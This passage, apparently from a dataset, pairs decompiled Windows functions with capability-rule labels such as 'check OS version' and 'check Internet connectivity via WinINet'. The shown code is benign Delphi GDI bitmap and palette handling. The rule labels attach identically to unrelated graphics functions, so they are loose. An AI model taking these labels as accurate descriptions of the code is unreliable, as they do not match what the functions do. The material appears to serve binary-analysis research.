&fcn.0042968c::var_11h;\n        uStack84 = *(var_4h + 4);\n        puStack88 = 0x429737;\n        sub.gdi32.dll_GetBrushOrgEx();\n        puStack88 = 0x4;\n        uStack92 = *(var_4h + 4);\n        puStack96 = 0x429745;\n        sub.gdi32.dll_SetStretchBltMode();\n        puStack96 = &fcn.0042968c::var_11h;\n        puStack100 = var_dh;\n        uStack104 = var_11h;\n        uStack108 = *(var_4h + 4);\n        sub.gdi32.dll_SetBrushOrgEx();\n    }\n    else {\n        puStack80 = 0x429766;\n        cVar2 = fcn.00429a18();\n        if (cVar2 == '\\0') {\n            puStack80 = 0x3;\n            uStack84 = 0x429774;\n            uStack84 = fcn.004256c0();\n            puStack88 = 0x42977a;\n            sub.gdi32.dll_SetStretchBltMode();\n        }\n    }\n    uStack92 = 0x4298ca;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack100 = 0x42978f;\n    puStack88 = &stack0xfffffffc;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        puStack100 = 0x42979a;\n        fcn.00429ca8();\n    }\n    puStack100 = 0x4297a1;\n    fcn.0042995c();\n    puStack100 = 0x4297ad;\n    fcn.0042579c();\n    puStack100 = 0x4297b4;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        uStack104 = 0x42985f;\n        uStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar3 = fcn.00425ac4();\n        iVar4 = sub.gdi32.dll_SelectObject(iVar3, *(iVar6 + 0xc));\n        arg_2ch = param_1[2] - *param_1;\n        arg_28h = param_1[3] - param_1[1];\n        iVar5 = fcn.0042995c();\n        uVar7 = 0;\n        fcn.00425c74(0, 0, iVar3, *(iVar6 + 0x20), *(iVar6 + 0x1c), 0, 0, *(iVar5 + 4), arg_28h, arg_2ch);\n        *in_FS_OFFSET = uVar7;\n        if (iVar4 != 0) {\n            sub.gdi32.dll_SelectObject(iVar3, iVar4, 0x4298a4);\n        }\n        if (iVar3 != 0) {\n            sub.gdi32.dll_DeleteDC(iVar3);\n        }\n        return;\n    }\n    puStack100 = *(var_4h + 0x20);\n    uStack104 = *(iVar6 + 0x20);\n    uStack108 = *(iVar6 + 0x1c);\n    iVar6 = fcn.0042995c(0, 0);\n    uVar7 = *(var_4h + 4);\n    sub.gdi32.dll_StretchBlt(uVar7, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], *(iVar6 + 4));\n    *in_FS_OFFSET = uVar7;\n    if (var_9h != '\\0') {\n        sub.gdi32.dll_SelectPalette(*(var_4h + 4), var_8h, 0xffffffff, 0x4298d1);\n    }\n    return;\n}\n",
        "token_count": 1577
    },
    "004298dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004298dc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (1 < *(iVar1 + 4)) {\n        fcn.00429c08();\n        fcn.00429528(iVar1 + 0x18);\n        return;\n    }\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 8) != *(iVar1 + 0x14))) {\n        if ((*(iVar1 + 0x14) != 0) && (iVar2 = sub.gdi32.dll_DeleteObject(*(iVar1 + 0x14)),  iVar2 == 0)) {\n            fcn.00425a1c();\n        }\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x2c) = 0;\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "0042995c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0042995c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0xb] == 0) {\n        fcn.00429c08();\n        if (in_EAX[0xb] == 0) {\n            iVar1 = fcn.004286ec();\n            in_EAX[0xb] = iVar1;\n            *(iVar1 + 0x2c) = in_EAX;\n            *(iVar1 + 0x28) = *(*in_EAX + 0x10);\n            *(iVar1 + 0x34) = in_EAX;\n            *(iVar1 + 0x30) = fcn.004295e8;\n        }\n    }\n    return in_EAX[0xb];\n}\n",
        "token_count": 178
    },
    "004299c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004299c8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    unkbyte3 Var3;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    Var3 = iVar1 >> 8;\n    if ((*(iVar1 + 8) == 0) || (*(iVar1 + 8) == *(iVar1 + 0x14))) {\n        if (*(iVar1 + 0x14) != 0) {\n            return 0;\n        }\n        if (*(iVar1 + 0x30) == 0) {\n            uVar2 = CONCAT31(Var3, 1);\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = CONCAT31(Var3, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "00429b84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429b84(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x14) == 0)) {\n        fcn.00429d08();\n        if (*(iVar1 + 0x30) == 0) {\n            sub.gdi32.dll_GetObjectA(*(iVar1 + 8), 0x54, iVar1 + 0x18);\n            *(iVar1 + 0x30) = 0x28;\n            *(iVar1 + 0x34) = *(iVar1 + 0x1c);\n            *(iVar1 + 0x38) = *(iVar1 + 0x20);\n            *(iVar1 + 0x3c) = 1;\n            *(iVar1 + 0x3e) = *(iVar1 + 0x28) * *(iVar1 + 0x2a);\n        }\n        uVar2 = fcn.00428ab4(0, iVar1 + 0x18);\n        *(iVar1 + 0x14) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "00429c08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429c08(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (((*(iVar1 + 8) == 0) && (*(iVar1 + 0x14) == 0)) && (*(iVar1 + 0x6c) != 0)) {\n        puStackY32 = 0x429c35;\n        fcn.0041b750(0, 0);\n        iVar1 = in_EAX[4];\n        iVar2 = in_EAX[5];\n        uStackY36 = 0x429c8b;\n        uStackY40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        in_EAX[4] = 0;\n        in_EAX[5] = 0;\n        puStackY32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x54))();\n        *in_FS_OFFSET = uStackY40;\n        in_EAX[4] = iVar1;\n        in_EAX[5] = iVar2;\n        return;\n    }\n    iVar1 = in_EAX[10];\n    if (*(iVar1 + 8) == 0) {\n        *(iVar1 + 8) = *(iVar1 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "00429ca8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429ca8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((*(in_EAX + 0x32) == '\\0') || (*(in_EAX + 0x31) == '\\0')) {\n        iVar1 = *(in_EAX + 0x28);\n        if (*(iVar1 + 0xc) != 0) {\n            fcn.00428670();\n            sub.gdi32.dll_DeleteObject(*(iVar1 + 0xc));\n            *(iVar1 + 0xc) = 0;\n        }\n        fcn.00429bf8();\n        fcn.00429c08();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.00429b34();\n        uVar2 = fcn.0042917c();\n        *(iVar1 + 0xc) = uVar2;\n        *(in_EAX + 0x32) = 1;\n        *(in_EAX + 0x31) = 1;\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "00429d08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429d08(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char cVar6;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(in_EAX + 0x30) != '\\0') {\n        return;\n    }\n    if (*(iVar1 + 0x10) != 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == *(iVar1 + 8)) {\n        fcn.00428670();\n    }\n    iVar2 = fcn.004261bc();\n    *(iVar1 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.user32.dll_GetDC(0);\n    uVar3 = fcn.00425ac4();\n    if (*(iVar1 + 0x71) == '\\0') {\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xc);\n        iVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xe);\n        if (*(iVar1 + 0x2a) * *(iVar1 + 0x28) <= iVar2 * iVar4) {\n            cVar6 = '\\0';\n            goto code_r0x00429d99;\n        }\n    }\n    cVar6 = '\\x01';\ncode_r0x00429d99:\n    *(iVar1 + 0x71) = cVar6;\n    if (cVar6 != '\\0') {\n        uVar5 = sub.gdi32.dll_CreateHalftonePalette(uVar3);\n        *(iVar1 + 0x10) = uVar5;\n    }\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    if (*(iVar1 + 0x10) == 0) {\n        *(in_EAX + 0x30) = 1;\n    }\n    return;\n}\n",
        "token_count": 471
    },
    "00429dc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429dc0(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int16_t in_DX;\n    uint var_54h;\n    int32_t var_40h;\n    uint var_3ch;\n    \n    if ((in_DX != 2) || (in_ECX == 0)) {\n        fcn.0042598c();\n    }\n    fcn.00429bf8();\n    fcn.00403af4();\n    sub.gdi32.dll_GetObjectA();\n    if (var_40h == 0) {\n        var_3ch = 0;\n    }\n    fcn.00429528(&var_54h);\n    *(in_EAX[10] + 0x70) = 0;\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 236
    },
    "00429e68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429e68(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x429e84;\n    iVar1 = fcn.00404620();\n    puStack32 = 0x429ef0;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(iVar1 + 8) = in_EDX;\n    *(iVar1 + 0x10) = in_ECX;\n    puVar4 = iVar1 + 0x18;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar1 + 0x70) = arg_ch;\n    if (*(iVar1 + 0x2c) != 0) {\n        *(iVar1 + 0x14) = *(iVar1 + 8);\n    }\n    uStack40 = 0x429ee0;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = fcn.00404800();\n    *(iVar1 + 0x6c) = uVar2;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x49aa18;\n    puStack32 = 0x429f11;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack36 = 0x429f50;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.004288e4();\n    *(in_EAX + 0x28) = iVar1;\n    fcn.004288e0();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x429f57;\n    uStack36 = 0x49aa18;\n    uStack40 = 0x429f4f;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 572
    },
    "0042a8dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042a8dc(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    int32_t var_9h;\n    int32_t *var_4h;\n    \n    uStack116 = 0x42a8f2;\n    var_4h = in_EAX;\n    uVar2 = fcn.00429a48();\n    if (param_2 != uVar2) {\n        if (param_2 == 0) {\n            uStack116 = 0x42a910;\n            (**(*var_4h + 0x70))();\n        }\n        else {\n            if (param_2 != 8) {\n                uStack116 = 0x42a933;\n                fcn.00403af4();\n                iVar1 = var_4h[10];\n                puVar5 = iVar1 + 0x18;\n                puVar6 = &fcn.0042a8dc::var_5dh;\n                for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                var_9h._0_1_ = '\\0';\n                var_49h = 0;\n                var_45h = 0x28;\n                var_41h = var_59h;\n                var_3dh = var_55h;\n                var_39h._0_2_ = 1;\n                var_39h._2_2_ = *(param_2 + 0x492e4f);\n                unique0x00007a00 = *(iVar1 + 0x10);\n                if (param_2 == 2) {\n                    stack0xfffffff4 = *0x49a9fc;\n                }\n                else if (param_2 == 3) {\n                    uStack116 = 0;\n                    uStack120 = 0x42a99d;\n                    sub.user32.dll_GetDC();\n                    uStack120 = 0x42a9a2;\n                    uVar3 = fcn.00425ac4();\n                    uStack124 = 0x42a9aa;\n                    uStack120 = uVar3;\n                    *NULL = sub.gdi32.dll_CreateHalftonePalette();\n                    var_9h._0_1_ = '\\x01';\n                    uStack128 = 0;\n                    puStack132 = 0x42a9b9;\n                    uStack124 = uVar3;\n                    sub.user32.dll_ReleaseDC();\n                }\n                else if (param_2 == 5) {\n                    var_35h = 3;\n                    var_1dh = 0xf800;\n                    var_19h = 0x7e0;\n                    var_15h = 0x1f;\n                }\n                uStack136 = 0x42aa28;\n                iStack140 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff74;\n                puVar5 = &fcn.0042a8dc::var_5dh;\n                puStack132 = &stack0xfffffffc;\n                (**(*var_4h + 0x68))();\n                fcn.00429528(puVar5);\n                *(var_4h + 0x22) = stack0xfffffff4 != 0;\n                *in_FS_OFFSET = puVar5;\n                uStack136 = 0x42aa2f;\n                if (var_9h != '\\0') {\n                    iStack140 = stack0xfffffff4;\n                    sub.gdi32.dll_DeleteObject();\n                }\n                return;\n            }\n            uStack116 = 0x42a91f;\n            fcn.0042598c();\n        }\n    }\n    return;\n}\n",
        "token_count": 1036
    },
    "0042aa68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042aa68(char param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iStackY1120;\n    uchar *puStackY1116;\n    char cVar5;\n    char cStack1080;\n    uchar auStack1054 [1038];\n    \n    fcn.00403af4();\n    puVar1 = *(*(in_EAX + 0x28) + 0x6c);\n    if (puVar1 == NULL) {\n        fcn.00429b84();\n        iVar2 = *(in_EAX + 0x28);\n        if (*(iVar2 + 0x14) != 0) {\n            cVar5 = *(iVar2 + 0x50);\n            fcn.00426918(*(iVar2 + 0x50));\n            if (*(iVar2 + 0x70) != '\\0') {\n                cStack1080 = '\\f';\n                if (*(iVar2 + 0x3e) < 9) {\n                    cStack1080 = (1 << (*(iVar2 + 0x3e) & 0x1f)) * '\\x03' + '\\f';\n                }\n            }\n            fcn.00403af4(cVar5 + cStack1080 + '\\x0e');\n            fcn.0042995c();\n            fcn.0042579c();\n            sub.gdi32.dll_SelectObject(*(*(in_EAX + 0x2c) + 4), *(iVar2 + 0x14));\n            fcn.00425ac4();\n            sub.gdi32.dll_GetDIBColorTable(*(*(in_EAX + 0x2c) + 4), 0, 0x100);\n            iStackY1120 = *(*(in_EAX + 0x2c) + 4);\n            sub.gdi32.dll_SelectObject();\n            puVar3 = *(iVar2 + 0x50);\n            puStackY1116 = auStack1054;\n            if ((puVar3 != NULL) && (puVar3 < auStack1054)) {\n                puStackY1116 = puVar3;\n            }\n            if ((((*(iVar2 + 0x70) == '\\0') && (puStackY1116 == NULL)) && (*(iVar2 + 0x10) != 0)) &&\n               ((*(iVar2 + 0x71) == '\\0' && (puStackY1116 = fcn.00426260(),  8 < *(iVar2 + 0x3e))))) {\n                iStackY1120 = iStackY1120 + puStackY1116 * 4;\n            }\n        }\n        if (param_1 != '\\0') {\n            fcn.0041b994();\n        }\n        if (iStackY1120 != 0) {\n            fcn.00428a68();\n            if (puStackY1116 != NULL) {\n                if ((*(iVar2 + 0x50) == NULL) || (*(iVar2 + 0x50) != puStackY1116)) {\n                    *(iVar2 + 0x50) = puStackY1116;\n                }\n                if (*(iVar2 + 0x70) != '\\0') {\n                    fcn.00425f3c();\n                }\n            }\n            if (*(iVar2 + 0x70) == '\\0') {\n                fcn.0041b994();\n                fcn.0041b994();\n                if ((8 < *(iVar2 + 0x3e)) && ((*(iVar2 + 0x40) & 3) != 0)) {\n                    fcn.0041b994();\n                }\n            }\n            else {\n                fcn.0041b994();\n                fcn.0041b994();\n            }\n            fcn.0041b994();\n            fcn.0041b994();\n        }\n    }\n    else {\n        uVar4 = (***puVar1)();\n        if (param_1 != '\\0') {\n            fcn.0041b994(uVar4);\n        }\n        (****(*(in_EAX + 0x28) + 0x6c))();\n        (**(*param_2 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 961
    },
    "0042aff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042aff0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uStack32;\n    int16_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) == 0) && (*(iVar1 + 0xc) != 0)) {\n        iVar2 = 0;\n        fcn.0041b750(0, 0);\n        uStack32 = 0x42b01f;\n        fcn.0041b95c();\n        if (iVar2 != 0) {\n            if (iVar2 == 1) {\n                uStack32 = 6;\n                fcn.00426510(iVar1 + 0x10, in_EAX + 0x2c);\n            }\n            else {\n                uStack32 = 0x42b05b;\n                fcn.004259b0();\n            }\n        }\n        *(iVar1 + 8) = uStack32;\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "0042b068": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042b068(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(iVar1 + 0xc) == 0) {\n        if (*(iVar1 + 8) == 0) {\n            puStack32 = 0x42b08b;\n            fcn.004259b0();\n        }\n        puStack32 = 0x42b097;\n        uVar2 = fcn.00404620();\n        uStack36 = 0x42b0f5;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.0042afb4();\n        if (iVar3 == *0x49aa14) {\n            fcn.00403af4();\n            fcn.0041b994();\n        }\n        else {\n            fcn.0042afb4();\n            fcn.00426a60();\n        }\n        *in_FS_OFFSET = uStack40;\n        *(iVar1 + 0xc) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "0042b680": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b680(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42b698;\n    fcn.0042b668();\n    uStack32 = 0x42b721;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    for (var_8h = *(in_EAX + 4); (var_8h != NULL && ((param_2 != var_8h[2] || (param_1 != var_8h[3]))));\n        var_8h = *var_8h) {\n    }\n    if (var_8h == NULL) {\n        puStack28 = &stack0xfffffffc;\n        puVar1 = fcn.00402f00();\n        *puVar1 = *(in_EAX + 4);\n        uVar2 = fcn.0042b734();\n        puVar1[1] = uVar2;\n        puVar1[2] = param_2;\n        puVar1[3] = param_1;\n        *(in_EAX + 4) = puVar1;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42b728;\n    uStack32 = 0x42b720;\n    fcn.0042b674();\n    return;\n}\n",
        "token_count": 370
    },
    "0042b8b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042b8b4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x49aa58 != 0) {\n        uVar1 = fcn.004241dc();\n        fcn.004241dc(uVar1);\n        iVar2 = fcn.0042b680();\n        return *(iVar2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 93
    },
    "0042bba4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bba4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack56 = 0x42bbc1;\n        in_EAX = fcn.00404974();\n    }\n    uStack60 = 0x42bc4e;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fcn.004055c8();\n    fcn.0040d2f0();\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040afb4(arg_8h_00);\n    fcn.0040dc90(arg_8h);\n    *(in_EAX + 0xc) = arg_ch;\n    *in_FS_OFFSET = arg_8h;\n    uStack64 = 0x42bc55;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 305
    },
    "0042c8e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c8e0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uchar auStack76 [4];\n    int32_t iStack72;\n    int32_t iStack64;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42c9a5;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == -0x7ffdfff7) {\n        arg_14h = *(in_EDX + 0x1c);\n        puStack32 = &stack0xfffffffc;\n        fcn.004057d4();\n        arg_10h = 0;\n        fcn.004057d4();\n        arg_ch = 0;\n        arg_8h_00 = *(in_EDX + 0x10);\n        fcn.004057d4();\n        iStack64 = fcn.0042bc78(arg_8h_00, arg_ch, arg_10h, arg_14h);\n        if (arg_8h != '\\0') {\n            fcn.004061e4();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack64 = fcn.0042bba4(0, in_EAX);\n    }\n    if (in_ECX != 0) {\n        iStack72 = iStack64;\n        if (iStack64 == 0) {\n            iStack72 = fcn.00405470();\n        }\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x496014)(0xeedfade, 1, 7, auStack76);\n        return;\n    }\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_10h;\n    uStack40 = 0x42c9ac;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 542
    },
    "0042cc0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
